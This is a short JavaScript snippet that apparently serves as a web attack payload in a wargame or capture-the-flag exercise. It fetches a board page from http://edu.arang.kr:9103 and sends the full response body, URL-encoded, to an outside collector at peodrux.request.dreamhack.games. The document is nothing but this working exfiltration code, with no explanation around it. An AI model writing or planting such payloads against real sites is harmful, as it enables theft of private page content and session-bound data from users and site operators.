fetch("http://edu.arang.kr:9103/board/0")
  .then(r => r.text())
  .then(body => {
    fetch(
      "https://peodrux.request.dreamhack.games?x=" +
      encodeURIComponent(body)
    );
  });
